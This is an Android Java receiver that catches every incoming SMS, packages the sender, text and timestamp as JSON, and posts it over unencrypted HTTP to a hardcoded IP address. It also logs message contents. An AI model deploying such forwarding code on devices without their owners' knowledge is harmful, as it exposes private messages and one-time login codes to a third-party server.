package com.example.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.gson.Gson;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if(intent.getAction().equalsIgnoreCase("android.provider.Telephony.SMS_RECEIVED" ) ) {
            Log.i("LOG", "MESSAGE RECEIVED");
            Bundle data  = intent.getExtras();
            Object[] pdus = (Object[]) data.get("pdus");
            int pduLength = pdus.length;
            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdus[pduLength-1]);
            String address= smsMessage.getDisplayOriginatingAddress();
            String message = smsMessage.getDisplayMessageBody();
            Message message1 = new Message();
            message1.setFromAddress(address);
            message1.setMessageContent(message);
            long smsReceiveTime = System.currentTimeMillis();
            message1.setTimeStamp(String.valueOf(smsReceiveTime));
            String bodyToPost = new Gson().toJson(message1);
            Log.i("LOG", bodyToPost);
            new AsyncTaskRun().execute(bodyToPost);
        } else {
            Log.i("LOG", "MESSAGE RECEIVED1");
        }
        Log.i("LOG", "MESSAGE RECEIVED1");
    }
    private class AsyncTaskRun extends AsyncTask {

        @Override
        protected Object doInBackground(Object[] objects) {
            Log.i("LOG", objects[0].toString());
            run(objects[0].toString());
            return null;
        }

        void run(String body) {
            URL url;
            HttpURLConnection urlConnection = null;
            try {
                Log.i("LOG", "POSTING THE DATA");
                url = new URL("http://35.178.147.52:8080/store/sms");
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("POST");
                urlConnection.setRequestProperty("Content-Type","application/json");
                urlConnection.setDoOutput(true);
                DataOutputStream wr = new DataOutputStream(urlConnection.getOutputStream());
                wr.writeBytes(body);
                wr.flush();
                wr.close();
                int responseCode = urlConnection.getResponseCode();
                Log.i("LOG", String.valueOf(responseCode));
                BufferedReader br;
                if (200 <= urlConnection.getResponseCode() && urlConnection.getResponseCode() <= 299) {
                    br = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                } else {
                    br = new BufferedReader(new InputStreamReader(urlConnection.getErrorStream()));
                }
                StringBuilder sb = new StringBuilder();
                String output;
                while ((output = br.readLine()) != null) {
                    sb.append(output);
                }
                String message = sb.toString();
                Log.i("LOG", message);
            } catch (Exception ex) {

            } finally {
                urlConnection.disconnect();
            }
        }
    }
}
